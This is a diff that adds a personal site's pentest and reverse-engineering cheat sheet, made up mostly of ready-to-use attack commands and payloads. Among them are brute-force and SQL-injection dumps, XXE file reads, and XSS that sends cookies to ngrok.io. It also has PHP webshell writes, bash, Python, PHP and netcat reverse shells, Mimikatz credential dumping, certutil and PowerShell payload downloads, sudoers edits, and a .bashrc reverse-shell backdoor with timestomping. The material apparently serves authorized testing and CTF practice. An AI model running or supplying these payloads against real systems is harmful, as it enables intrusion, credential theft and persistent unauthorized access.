@@ -1,0 +1,448 @@
+---
+layout: page
+nav: cheatsheet
+title: "CheatSheet"
+subtitle: "Pentest, reverse engineering, and exploitation quick reference. Originally my basic.txt — now organized."
+description: "Penetration testing and reverse engineering cheat sheet — commands for brute force, scanning, enumeration, exploitation, and more."
+styles: /assets/css/cheatsheet.css
+---
+
+<details class="cs-collapsible" open>
+<summary>Brute Force</summary>
+<pre><code>hydra -l username -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:S=302" -V
+hydra -l username -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+hydra -l username -P /usr/share/wordlists/rockyou.txt $IP -t 4 mysql
+
+wpscan --url $IP -U username --passwords /etc/wordlists/rockyou.txt
+ffuf -w /usr/share/wordlists/10k-most-common.txt -X POST -d '$data' -u http://$IP/FUZZ
+ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://$IP/FUZZ -e php</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Scanning</summary>
+<pre><code>nmap -A -T4 -oN scan $IP
+nmap -sV -sC -Pn -n -A $IP
+rustscan -a $IP  -- -A
+
+nikto -h $IP
+zaproxy
+snyk
+Nessus</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Enumeration</summary>
+<h3>Directory / File</h3>
+<pre><code>ffuf -c -w /usr/share/wordlists/rockyou.txt -t 50 -e txt,php,db --hc 404 -u $IP
+gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt -t 100 -u $IP
+gobuster vhost --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -u $IP
+
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "identifier=admin&password=FUZZ" -u $IP
+
+enum4linux -a $IP
+sqlmap -u $IP/loginpage --forms --dump
+wpscan --url $IP --api-token "YOUR_TOKEN"
+
+gitleaks --repo-path $path -v</code></pre>
+
+<h3>Subdomains</h3>
+<pre><code>shodan.io
+amass enum -passive -d example.com -o example.com.subs.txt
+amass enum -active -brute -w /path/DNS/clean-jhaddix-dns.txt -d example.com -o example.com.subs.brute.txt
+amass enum -df rootdomains.txt -max-dns-queries 100 -w subdomains.txt -o foundSubdomains.txt</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Horizontal &amp; Vertical Enumeration</summary>
+<h3>Horizontal</h3>
+<pre><code>whois domain.com
+dig a subdomain.domain.com +short
+
+# Certificate transparency, copyright, terms
+intext:"©2021 imaginaryCompany All rights reserved."</code></pre>
+<div class="cs-links"><a href="https://viewdns.info/" target="_blank">viewdns.info</a><a href="https://bgpview.io/" target="_blank">bgpview.io</a></div>
+
+<h3>Vertical — Certs</h3>
+<div class="cs-links"><a href="https://crt.sh" target="_blank">crt.sh</a></div>
+
+<h3>Vertical — Wayback</h3>
+<pre><code>cat domains.txt | waybackurls > urls</code></pre>
+<div class="cs-links"><a href="https://github.com/lc/gau" target="_blank">gau + urlscan api</a></div>
+
+<h3>Vertical — OSINT</h3>
+<p>pastebin (intext:), github or gitlab, <a href="https://github.com/gwen001/github-search" target="_blank">github-search</a></p>
+
+<h3>Existing Databases</h3>
+<pre><code>zgrep '\.domain\.com",' path_to_chosen_dataset.json.gz</code></pre>
+<div class="cs-links"><a href="https://opendata.rapid7.com/sonar.fdns_v2/" target="_blank">Rapid7 Sonar</a><a href="https://wordlists.assetnote.io/" target="_blank">Assetnote Wordlists</a><a href="https://github.com/assetnote/commonspeak2" target="_blank">Commonspeak2</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>Domain Zone Transfer</summary>
+<pre><code>dig axfr @&lt;DNS_IP&gt;                       # try without domain
+dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;              # guess the domain
+fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt;
+dig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt;              # ANY, A, AAAA, TXT, MX, NS...</code></pre>
+<div class="cs-links"><a href="https://mxtoolbox.com" target="_blank">mxtoolbox.com</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>Port 389/636 — LDAP</summary>
+<pre><code>crackmapexec
+ldapsearch -x -h &lt;IP&gt; -s base namingcontexts
+ldapsearch -x -h &lt;IP&gt; -b '&lt;naming context&gt;'
+
+# Example
+ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Connecting / Mounting</summary>
+<pre><code>showmount -e $IP
+sudo mount $IP:/file/trace /tmp
+
+/usr/bin/smbclient \\$IP\file
+/usr/bin/smbclient -L $IP
+
+mysql --protocol=tcp --host=$IP --port=3306 --user=root -p
+xfreerdp /u:"user" /p:"pass" /v:$IP</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Cracking</summary>
+<pre><code># SSH keys
+/usr/share/john/ssh2john.py (file) > output
+sudo john -w=/usr/share/wordlists/rockyou.txt (hash)
+hashcat -m "type" .txt /usr/share/wordlists/rockyou.txt
+
+# Archives
+sudo zip2john .zip > output
+sudo rar2john .rar > hash
+fcrackzip .zip
+7z e .zip
+
+# GPG
+sudo gpg2john .asc > output
+gpg --import .asc
+gpg --decrypt .pgp</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Privilege Escalation</summary>
+<pre><code>python3 -c "import pty;pty.spawn('/bin/bash')"
+getcap -r / 2>/dev/null
+ps -aux
+netstat -lntup / -tulwn
+cat ~/.*history | less
+
+# SETUID or SETGID bits
+find / -type f \( -perm -4000 -o -perm -2000 \) -print
+find / -name flag.txt -user.txt -type f 2>/dev/null
+
+# Writable
+find /etc -writable -ls 2>/dev/null
+
+# Sudoers
+echo '$user  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ALL=(ALL:ALL) NOPASSWD:ALL
+
+# Cron
+*  *    * * *   root    bash /tmp/zsr</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Upgrading Shell</summary>
+<pre><code># With Python
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+# Without Python
+/usr/bin/script -qc /bin/bash /dev/null
+
+# Full TTY
+^Z
+stty raw -echo; fg
+export TERM=xterm-256color
+stty rows &lt;num&gt; columns &lt;cols&gt;</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Binary Exploitation</summary>
+<h3>Tools</h3>
+<pre><code>rabin2 (-z, -I), gdb, r2 (aaa, pdf), strings
+xxd, ltrace, strace, objdump, hexedit, hexdump
+checksec --file=&lt;file&gt;</code></pre>
+<h3>Pattern offset</h3>
+<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6A413969</code></pre>
+<h3>Vulnerable functions</h3>
+<pre><code>gets() & strcpy() & strcat() & strcmp() & sprintf()</code></pre>
+<h3>Core dump</h3>
+<pre><code>^Z
+kill -s SIGSEGV PID && fg
+apport-unpack /var/crashes/_$program_.crash /tmp/crash-report</code></pre>
+<div class="cs-links"><a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html" target="_blank">pattern generator</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>Reverse Engineering</summary>
+<pre><code>strace ./file
+ltrace ./file
+objdump -x file
+strings file
+upx -d file -o output
+
+# Editors
+r2 -A file
+Ghidra
+cutter</code></pre>
+<div class="cs-links"><a href="https://www.youtube.com/watch?v=RCgEIBfnTEI" target="_blank">RE tutorial (YouTube)</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>XSS</summary>
+<pre><code>'&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(document.cookie) &gt;
+&lt;script&gt;document.location = "ngrok.io"+ document.cookie &lt;/script&gt;
+
+xsser -- automatic framework for xss</code></pre>
+<h3>WAF</h3>
+<div class="cs-links"><a href="https://github.com/EnableSecurity/wafw00f" target="_blank">wafw00f — detect</a><a href="https://github.com/0xInfection/Awesome-WAF#known-bypasses" target="_blank">Awesome-WAF — bypasses</a></div>
+<div class="cs-links"><a href="https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45" target="_blank">XSS cheatsheet</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>XXE</summary>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;
+&lt;root&gt;&read;&lt;/root&gt;
+
+&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php"&gt; ]&gt;</code></pre>
+<h3>SSRF + XXE</h3>
+<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;</code></pre>
+<h3>Blind — error based</h3>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;</code></pre>
+<h3>XInclude</h3>
+<pre><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</code></pre>
+<p>Upload vectors: docx (unzip), svg, image processing libraries (PNG/JPEG can support svg). Modified content-type: <code>Content-Type: text/xml</code></p>
+<div class="cs-links"><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank">XXE cheatsheet</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>SQL Injection</summary>
+<pre><code>-- Union injection
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users
+
+-- Comments
+--     : Comment Type 1
+--+    : Comment Type 2
+--+-   : SQL Comment
+/**/   : Inline Comment
+;%00   : Null Byte</code></pre>
+<h3>SQL → RCE</h3>
+<pre><code>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"
+SELECT sys_exec('chmod u+s /usr/bin/find');
+echo os.system('/bin/bash')</code></pre>
+<div class="cs-links"><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank">MSSQL cheatsheet</a><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">Payload list</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>Steganography</summary>
+<pre><code>stegcracker .png /usr/share/wordlists/rockyou.txt
+steghide --extract -sf .png
+stegoveritas .jpg
+binwalk --dd '.*' .jpg
+exiftool
+hexedit</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Reverse Shells</summary>
+<pre><code>bash -i >& /dev/tcp/$IP/4444 0>&1
+php -r '$sock=fsockopen("$IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP 4444 >/tmp/f</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>LFI — Local File Inclusion</summary>
+<pre><code>../../../etc/passwd
+
+# Bypass filters
+.././..
+..//..
+...//...
+%00 -- Nullbyte (php5)
+%%32%65</code></pre>
+<h3>Log Poisoning</h3>
+<pre><code>../../../../../../../etc/httpd/logs/access_log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/apache2/error.log
+
+curl "url" -H "User-Agent: &lt;?php system($_GET['c']); ?&gt;"
+php://filter/convert.base64-encode/resource=</code></pre>
+<div class="cs-links"><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank">LFI cheatsheet</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>SSRF &amp; CSRF</summary>
+<pre><code># SSRF — redirect to localhost
+file://
+gopher://  (could lead to RCE — Gopherus)
+ftp:// dict:// ssh:// smb:// http:// https://</code></pre>
+<p>SSRF is powerful when combined with a second vulnerability. CSRF = delete profile / send something.</p>
+</details>
+
+<details class="cs-collapsible">
+<summary>Windows</summary>
+<h3>Reset Password</h3>
+<pre><code># SAM
+Windows/System32/config
+sudo chntpw -i SAM
+
+# Mimikatz
+privilege::debug
+lsadump::sam
+sekurlsa::logonpasswords</code></pre>
+<h3>Reverse Shell</h3>
+<div class="cs-links"><a href="https://amsi.fail/" target="_blank">amsi.fail</a><a href="https://raikia.com/tool-powershell-encoder/" target="_blank">PowerShell encoder</a></div>
+<h3>Transfer Files</h3>
+<pre><code>certutil.exe -urlcache -split -f http://&lt;IP&gt;/file.exe
+powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://&lt;IP&gt;/file.exe', 'C:\temp\file.exe')</code></pre>
+<h3>Firewall</h3>
+<pre><code>netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Networking &amp; Port Forwarding</summary>
+<pre><code>sudo tcpdump -i tun0
+service apache2 start
+python3 -m http.server 1800
+
+ssh -i ~/.ssh/id_rsa -L $ACK_PORT:127.0.0.1:$VIC_PORT $USER@$IP -fN</code></pre>
+<div class="cs-links"><a href="https://apackets.com/" target="_blank">apackets.com — packet analyzer</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>AWS — Amazon Cloud</summary>
+<pre><code>aws configure --profile ""
+aws s3 ls --profile ""
+
+aws sts get-access-key-info --access-key-id "AKIA**"
+aws sts get-caller-identity --profile ""
+
+aws ec2 describe-instances --output text --profile ""
+aws secretsmanager list-secrets --profile hr
+aws secretsmanager get-secret-value --secret-id "" --profile "" --region ""</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Linux Backdoors &amp; Bash Loops</summary>
+<h3>Backdoors</h3>
+<pre><code>ssh-keygen
+# .so file, php file
+echo 'bash -i >& /dev/tcp/$IP/4444 0>&1' >> ~/.bashrc
+touch -t YYYYMMDDhhmm &lt;file&gt;  # modify creation time</code></pre>
+<h3>Bash Loops</h3>
+<pre><code>for i in {1..100}; do (sleep 1; echo "get /") | telnet $IP $i | grep 550 >> x ; done
+for i in {2500..4500}; do COMMAND ; done
+while true ; do ssh -i id_rsa hades@hell -p `shuf -i 2500-4500 -n 1` ; done</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Google Dorks</summary>
+<pre><code>site:.eu responsible disclosure
+inurl:index.php?id=
+site:.nl bug bounty
+"index of" inurl:wp-content/       # Identify WordPress
+inurl:"q=user/password"            # Find Drupal
+site:example.com filetype:bak       # .mdf, .zip, .sql, .db, .pdf
+
+# OSINT
+site: codepen.io, pastebin (intext:)
+Aquatone</code></pre>
+<div class="cs-links"><a href="https://www.exploit-db.com/google-hacking-database" target="_blank">GHDB</a></div>
+</details>
+
+<details class="cs-collapsible">
+<summary>Misc &amp; Filtering</summary>
+<pre><code># Filtering wordlists
+grep -x '.\{8,20\}' > 8-20_length_wordlist
+grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt
+grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt
+grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt
+grep -v "^[A-Za-z0-9]*$" > contains_special.txt
+
+# Useful
+searchsploit -x example   # examine
+searchsploit -m example    # make copy
+jq -- pretty print json
+fakeroot
+/proc/$i/cmdline</code></pre>
+<h3>Aliases — troll mode</h3>
+<pre><code>alias ls='echo "command not found"'
+alias cat='echo "command not found"'
+alias nano='echo "command not found"'
+alias vim='echo "command not found"'
+alias cd='echo "command not found"'</code></pre>
+</details>
+
+<details class="cs-collapsible">
+<summary>Reference Links</summary>
+<div class="cs-links">
+<a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>
+<a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>
+<a href="https://jwt.io/" target="_blank">jwt.io</a>
+<a href="https://regex101.com/" target="_blank">regex101</a>
+<a href="https://godbolt.org/" target="_blank">godbolt (C→asm)</a>
+<a href="https://dogbolt.org/" target="_blank">dogbolt (asm→C)</a>
+<a href="https://hackersonlineclub.com/command-injection-cheatsheet/" target="_blank">Command Injection</a>
+<a href="http://shell-storm.org/shellcode/" target="_blank">Shellcode DB</a>
+<a href="https://github.com/jephk9/oscp-jewels" target="_blank">OSCP Jewels</a>
+<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database" target="_blank">OWASP Favicon</a>
+<a href="https://www.tarlogic.com/blog/how-to-attack-kerberos/" target="_blank">Attack Kerberos</a>
+<a href="https://cvedetails.com/" target="_blank">CVE Details</a>
+<a href="https://shodan.io/" target="_blank">Shodan</a>
+<a href="https://archive.org/" target="_blank">Wayback</a>
+<a href="https://who.is/" target="_blank">who.is</a>
+<a href="https://insecam.org/" target="_blank">Insecam</a>
+<a href="https://browserleaks.com/" target="_blank">Browser Leaks</a>
+<a href="https://simpleicons.org/" target="_blank">Simple Icons</a>
+<a href="https://github.com/tomnomnom/gf" target="_blank">gf (grep wrapper)</a>
+</div>
+</details>
+
+<details class="cs-collapsible">
+<summary>My Approach</summary>
+<div class="approach-grid">
+  <div class="approach-card">
+    <div class="approach-num">01</div>
+    <div class="approach-body">
+      <span class="hl">Static first.</span> Before running anything, read the binary — strings, imports, sections, entropy. Five minutes of static analysis beats an hour of blind detonation.
+    </div>
+  </div>
+  <div class="approach-card">
+    <div class="approach-num">02</div>
+    <div class="approach-body">
+      <span class="hl">Dynamic second.</span> Run the sample in an isolated lab and watch — processes, files, network, registry. Correlate observations with the static findings.
+    </div>
+  </div>
+  <div class="approach-card">
+    <div class="approach-num">03</div>
+    <div class="approach-body">
+      <span class="hl-p">Automate everything.</span> If you do it twice, script it. Custom signatures, AI-assisted decompilation, automated scanning — tools that save time compound.
+    </div>
+  </div>
+  <div class="approach-card">
+    <div class="approach-num">04</div>
+    <div class="approach-body">
+      <span class="hl-p">Document everything.</span> Every renamed function, every decoded string, every IOC gets written down. The blog is that documentation, made public.
+    </div>
+  </div>
+</div>
+</details>
